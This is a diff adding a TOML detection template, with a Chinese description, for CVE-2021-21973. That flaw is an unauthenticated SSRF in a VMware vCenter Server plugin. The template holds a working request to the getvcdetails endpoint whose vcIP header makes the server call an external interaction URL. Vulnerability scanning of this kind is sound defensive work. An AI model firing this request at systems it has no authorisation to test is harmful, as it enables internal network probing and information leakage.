@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "检测 VMware vCenter Server vSphere Client (HTML5) 的 vCenter Server 插件中未经认证的服务器端请求伪造（SSRF）漏洞。攻击者通过向 /ui/vropspluginui/rest/services/getvcdetails 端点发送包含自定义 Vcip 头的 GET 请求，可诱使服务器向任意 URL 发起 HTTP 请求，实现内网探测和信息泄露。"
+id = "POC-AVE-2021-0500"
+name = "VMware vCenter Server SSRF PoC"
+severity = "medium"
+tags = ["ave-2021-0500"]
+vuln_id = [
+    "CVE-2021-21973",
+    "AVE-2021-0500",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/ui/vropspluginui/rest/services/getvcdetails"
+protocol = "http"
+
+[poc.requests.headers]
+reqResource = "{{rand_base(6)}}"
+vcIP = "{{interactsh-url}}"
+vcPassword = "{{rand_base(6)}}"
+vcUsername = "{{rand_base(6)}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["The server sent HTTP status code 200"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [500]
+type = "status"
